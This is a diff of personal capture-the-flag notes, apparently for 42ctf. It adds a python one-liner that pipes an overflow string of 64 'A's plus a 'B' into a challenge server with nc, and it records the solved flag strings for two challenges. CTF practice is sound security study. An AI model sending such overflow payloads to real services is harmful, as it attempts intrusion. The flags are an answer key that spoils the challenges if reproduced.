@@ -15,14 +15,18 @@ EASY_TO_BRUTE_FORCE
 $ wget _
 $ tar zxvf _
 
-# for any x -gt 40
-$ (x=64; while [ $x -gt 0 ]; do echo -n "A"; x=$(( $x - 1 )); done) | nc challenges.42ctf.org 3002
+python3 -c "print('A' * 64 + 'B')" | nc challenges.42ctf.org 3002
 ```
+
 - what does `-zxvf` mean
   - z means (un)z̲ip
   - x means ex̲tract
   - v means print filenames v̲erbose
   - f means the following argument is a f̱ilename.
+
+flag : ``
+you_re_ready_for_the_real_pwn
+``
 
 # Client Side
 - inspect & enable checkbox
@@ -33,3 +37,7 @@ html_is_too_easy_for_you
 
 # It's all here
 - `exiftool _`
+
+flag : ``
+metada_has_no_secrets_for_you
+``
